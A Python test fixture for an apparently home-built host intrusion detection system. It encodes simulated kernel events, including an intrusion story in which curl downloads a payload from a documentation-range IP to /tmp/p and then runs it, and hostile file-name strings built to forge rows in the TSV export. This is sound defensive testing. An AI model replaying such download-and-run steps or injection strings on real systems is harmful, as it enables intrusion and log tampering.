"""Build P15R recordings for layer3 tests, from the kernel's own byte layout.

Nothing here builds a graph. Every record is produced by hids.events'
encode_event / encode_arg / encode_net — the same bytes the BPF program
emits — written with hids.replay.RawRecorder, and only ever turned into a
graph by the exporter's real replay path (decode -> EventProcessor ->
ProcessGraph). So a test that passes here has exercised the userspace stack
the VM runs, not a hand-made graph.
"""

import os
import socket
import sys

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..")
if ROOT not in sys.path:
    sys.path.insert(0, os.path.abspath(ROOT))

from hids import replay                                         # noqa: E402
from hids.events import (AF_INET, AF_INET6, AF_UNIX, ARG_FLAG_END,   # noqa: E402
                         EVENT_EXEC_ENTER, EVENT_EXEC_OK, EVENT_EXIT,
                         EVENT_OPEN, NET_FLAG_INBOUND, NET_FLAG_INPROGRESS,
                         NET_FLAG_NOPEER, encode_arg, encode_event, encode_net)

SEC = 10 ** 9
O_RDONLY, O_WRONLY, O_RDWR = os.O_RDONLY, os.O_WRONLY, os.O_RDWR
O_CREAT, O_TRUNC = os.O_CREAT, os.O_TRUNC


class Rec(object):
    """A list of raw payloads plus a registry of fake processes, so a
    scenario reads like a story: rec.fork(...), rec.exec(...), rec.open(...)."""

    def __init__(self):
        self.payloads = []
        self.procs = {}          # pid -> dict(start, ppid, comm)

    # -- process bookkeeping -------------------------------------------
    def spawn(self, pid, ppid, comm, start):
        self.procs[pid] = {"start": start, "ppid": ppid, "comm": comm}

    def _common(self, pid, ts):
        p = self.procs[pid]
        par = self.procs.get(p["ppid"], {"start": SEC, "comm": "systemd"})
        return dict(pid=pid, tid=pid, ppid=p["ppid"], uid=1000, gid=1000,
                    ts_ns=ts, start_ns=p["start"], pstart_ns=par["start"],
                    comm=p["comm"], tcomm=p["comm"], pcomm=par["comm"])

    # -- records ----------------------------------------------------------
    def exec(self, pid, ts, path, argv, new_comm, ino=0, dev=0, igen=0):
        """EXEC_ENTER + ARG* + END + EXEC_OK, the kernel path in the OK."""
        c = self._common(pid, ts)
        self.payloads.append(encode_event(type=EVENT_EXEC_ENTER, filename=path, **c))
        for i, a in enumerate(argv):
            self.payloads.append(encode_arg(pid, i, ts, a))
        self.payloads.append(encode_arg(pid, len(argv), ts, "", ARG_FLAG_END))
        self.procs[pid]["comm"] = new_comm
        c = self._common(pid, ts + 1000)
        self.payloads.append(encode_event(type=EVENT_EXEC_OK, filename=path,
                                          aux_ns=ts, ino=ino, dev=dev, igen=igen, **c))

    def open(self, pid, ts, path, flags=O_RDONLY, ret=3, ino=0, dev=0, igen=0):
        self.payloads.append(encode_event(type=EVENT_OPEN, filename=path, flags=flags,
                                          ret=ret, ino=ino, dev=dev, igen=igen,
                                          **self._common(pid, ts)))

    def exit(self, pid, ts, status=0):
        self.payloads.append(encode_event(type=EVENT_EXIT, ret=status,
                                          **self._common(pid, ts)))

    def _net(self, pid, ts, addr, port, path, ret, nflags, sock_type, fd):
        if path is not None:
            family = AF_UNIX
            raw_path = path.encode()
            # +2 for sun_family; an abstract name starts with NUL ('@' shown)
            if path == "":
                addrlen = 2                  # unnamed peer: family only
            elif path.startswith("@"):
                raw_path = b"\x00" + path[1:].encode()
                addrlen = 2 + len(raw_path)
            else:
                addrlen = 2 + len(raw_path) + 1
            daddr = b""
        elif ":" in addr:
            family, raw_path, addrlen = AF_INET6, b"", 28
            daddr = socket.inet_pton(socket.AF_INET6, addr)
        else:
            family, raw_path, addrlen = AF_INET, b"", 16
            daddr = socket.inet_pton(socket.AF_INET, addr)
        self.payloads.append(encode_net(
            ret=ret, fd=fd, family=family, dport=port, sport=0, nflags=nflags,
            daddr=daddr, path=raw_path, sock_type=sock_type, addrlen=addrlen,
            **self._common(pid, ts)))

    def connect(self, pid, ts, addr=None, port=0, path=None, ret=0,
                pending=False, sock_type=1):
        self._net(pid, ts, addr, port, path, -115 if pending else ret,
                  NET_FLAG_INPROGRESS if pending else 0, sock_type, 3)

    def accept(self, pid, ts, addr=None, peer_port=0, path=None, nopeer=False):
        flags = NET_FLAG_INBOUND | (NET_FLAG_NOPEER if nopeer else 0)
        if nopeer and path is None and addr is None:
            path = ""
        self._net(pid, ts, addr, peer_port, path, 7, flags, 1, 3)

    def write(self, path):
        r = replay.RawRecorder(path)
        for b in self.payloads:
            r.write(b)
        r.close()
        return r.count


# Attacker-controlled strings. A tab would shift TSV columns; a newline
# would end the line and let the rest of the path FORGE an edge row; "\r"
# ends a line too under Python's universal newlines (their loader opens in
# text mode); a literal backslash-t must stay distinguishable from a tab.
HOSTILE_PATH = ("/tmp/pay load\tPROC\tforged\n"
                "file:x_0\tEVENT_WRITE\tproc:1:0_1\t0.0\r\\tend")
HOSTILE_ARG = "a\tb\nc\\nd e"
HOSTILE_UNIX = "@evil sock\tname"


def full_scenario(with_hostile=True):
    """Intrusion-shaped recording covering every edge kind the graph makes.

    sshd(100) accepts inbound v4/v6/unix; bash(200) forked from it reads,
    writes, read-writes; curl(201) connects ok/refused/pending/probe/unix and
    writes a payload; the payload (202) runs; PID 300 is reused (two
    generations); two opens share one timestamp (tiebreak); everything exits.
    Returns a Rec.
    """
    r = Rec()
    r.spawn(100, 1, "sshd", 2 * SEC)
    r.accept(100, 10 * SEC, addr="203.0.113.9", peer_port=51515)
    r.accept(100, 10 * SEC + 500, addr="2001:db8::7", peer_port=40000)
    r.accept(100, 10 * SEC + 900, path="/run/sshd.sock")
    r.accept(100, 10 * SEC + 950, nopeer=True)

    r.spawn(200, 100, "sshd", 11 * SEC)            # forked; execs below
    r.exec(200, 11 * SEC + 100, "/bin/bash", ["bash", "-i"], "bash",
           ino=1001, dev=2049, igen=1)
    r.open(200, 12 * SEC, "/etc/passwd", O_RDONLY, ino=131074, dev=2049, igen=1)
    r.open(200, 13 * SEC, "/tmp/x", O_WRONLY | O_CREAT, ino=5005, dev=2049, igen=7)
    r.open(200, 13 * SEC + 500, "/tmp/rw", O_RDWR, ino=5006, dev=2049, igen=1)
    r.open(200, 13 * SEC + 600, "/nonexistent", O_RDONLY, ret=-2)
    r.open(200, 13 * SEC + 700, "rel.txt", O_RDONLY)            # no inode, relative
    r.open(200, 13 * SEC + 800, "/no/inode/abs", O_RDONLY)      # path: id

    r.spawn(201, 200, "bash", 14 * SEC)
    r.exec(201, 14 * SEC + 100, "/usr/bin/curl",
           ["curl", "-o", "/tmp/p", "http://198.51.100.5/p"], "curl",
           ino=1002, dev=2049, igen=1)
    r.connect(201, 14 * SEC + 500, addr="198.51.100.5", port=80)
    r.connect(201, 14 * SEC + 600, addr="192.0.2.1", port=22, ret=-111)
    r.connect(201, 14 * SEC + 700, addr="2001:db8::1", port=443, pending=True)
    r.connect(201, 14 * SEC + 800, addr="8.8.8.8", port=0, sock_type=2)   # probe
    r.connect(201, 14 * SEC + 900, path="/run/dbus/system_bus_socket")
    payload = HOSTILE_PATH if with_hostile else "/tmp/p"
    r.open(201, 15 * SEC, payload, O_WRONLY | O_CREAT | O_TRUNC,
           ino=7007, dev=2049, igen=3)
    r.exit(201, 16 * SEC)

    r.spawn(202, 200, "bash", 17 * SEC)
    r.exec(202, 17 * SEC + 100, payload,
           ["payload", HOSTILE_ARG if with_hostile else "x"], "payload",
           ino=7007, dev=2049, igen=3)
    if with_hostile:
        r.connect(202, 17 * SEC + 300, path=HOSTILE_UNIX)
    r.exit(202, 18 * SEC)

    # PID reuse: two lifetimes of 300, both read /tmp/x.
    r.spawn(300, 200, "bash", 20 * SEC)
    r.open(300, 21 * SEC, "/tmp/x", O_RDONLY, ino=5005, dev=2049, igen=7)
    r.exit(300, 22 * SEC)
    r.spawn(300, 200, "bash", 23 * SEC)
    r.open(300, 24 * SEC, "/tmp/x", O_RDONLY, ino=5005, dev=2049, igen=7)

    # Same timestamp, two files, opened in the "wrong" order: the tiebreak
    # must be by identity, not by arrival.
    r.open(200, 25 * SEC, "/etc/hosts", O_RDONLY, ino=131080, dev=2049, igen=1)
    r.open(200, 25 * SEC, "/etc/group", O_RDONLY, ino=131079, dev=2049, igen=1)
    r.exit(300, 26 * SEC)
    return r


def direction_scenario():
    """The smallest story with one edge of every kind, for S1(c)."""
    r = Rec()
    r.spawn(10, 1, "nginx", 2 * SEC)
    r.accept(10, 3 * SEC, addr="5.6.7.8", peer_port=50000)
    r.spawn(20, 10, "nginx", 4 * SEC)
    r.exec(20, 5 * SEC, "/bin/cat", ["cat", "/etc/passwd"], "cat",
           ino=11, dev=1, igen=1)
    r.open(20, 6 * SEC, "/etc/passwd", O_RDONLY, ino=12, dev=1, igen=1)
    r.open(20, 7 * SEC, "/tmp/out", O_WRONLY | O_CREAT, ino=13, dev=1, igen=1)
    r.open(20, 8 * SEC, "/tmp/both", O_RDWR, ino=14, dev=1, igen=1)
    r.connect(20, 9 * SEC, addr="1.2.3.4", port=443)
    r.exit(20, 10 * SEC)
    return r
